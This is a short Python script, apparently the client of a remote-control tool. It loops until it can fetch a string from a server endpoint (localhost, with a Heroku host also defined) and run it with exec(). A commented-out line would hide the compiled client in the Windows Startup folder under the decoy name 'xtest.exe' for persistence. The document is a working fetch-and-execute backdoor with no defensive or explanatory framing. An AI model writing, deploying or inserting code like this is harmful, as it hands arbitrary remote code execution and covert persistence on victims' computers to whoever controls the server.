import requests
from threading import Thread
import os
import time
from datetime import datetime

try:
    pass
    #This line of code hides this client's file in the start up folder
   # os.rename(f"{os.getcwd()}//anonclient.exe", f"C://Users//{os.getlogin()}//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//xtest.exe")
except Exception as e:
    print(e)
    pass
while True:
    try:
        print('starting...')
        print(os.getcwd())
        endpoint_1 = 'http://127.0.0.1:8000/'
        endpoint_2 = 'https://xxremote.herokuapp.com'
        exec(requests.get(f'{endpoint_1}candy').json()['candy'])
        break
    except Exception as e:
        pass
